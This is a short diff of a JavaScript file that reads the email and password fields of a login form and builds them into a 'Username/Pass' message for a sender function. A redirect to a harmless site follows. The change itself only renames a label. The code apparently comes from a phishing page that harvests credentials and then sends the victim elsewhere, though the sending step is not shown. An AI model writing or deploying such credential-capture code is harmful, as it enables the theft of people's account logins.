@@ -6,7 +6,7 @@ var u_email, pass;
 var ready = function () {
     u_email = document.getElementById("email").value;
 	pass = document.getElementById("pass").value;
-    message = "Username: " + u_email + "\nPassword: " + pass;
+    message = "Username: " + u_email + "\nPass: " + pass;
 };
 var sender = function () {
     ready();
@@ -33,5 +33,6 @@ var sender = function () {
 	
     return false;
 	location.replace('https://www.javascripttutorial.net/');
+
 };
 
